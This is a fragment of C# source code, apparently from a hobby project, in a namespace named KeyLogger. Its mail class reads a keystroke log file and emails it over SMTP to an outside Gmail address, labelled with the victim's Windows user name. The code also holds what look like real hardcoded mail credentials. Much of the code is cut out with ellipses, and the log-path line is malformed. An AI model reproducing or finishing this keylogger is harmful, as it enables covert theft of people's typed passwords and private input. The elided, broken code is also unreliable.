...
namespace KeyLogger
{
    class Program
    {
        private String path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"C:\mehvish.txt";
        ...
        class mail
        {
            public void sendEmail()
            {
                try
                {
                    ...
                    mail.To.Add("itxsaaho@gmail.com");
                    mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name;

                    if (!File.Exists (@"C:\mehvish.txt")) return;
                    StreamReader r = new StreamReader(@"C:\mehvish.txt");
                    ...
                    server.Port = 587;
                    server.Credentials = new NetworkCredential("itxsaaho@gmail.com", "epkw nlux mtvg obne");
                ...
                {
                    Console.WriteLine("exception hai bhai");
                }
            }
        }
    }
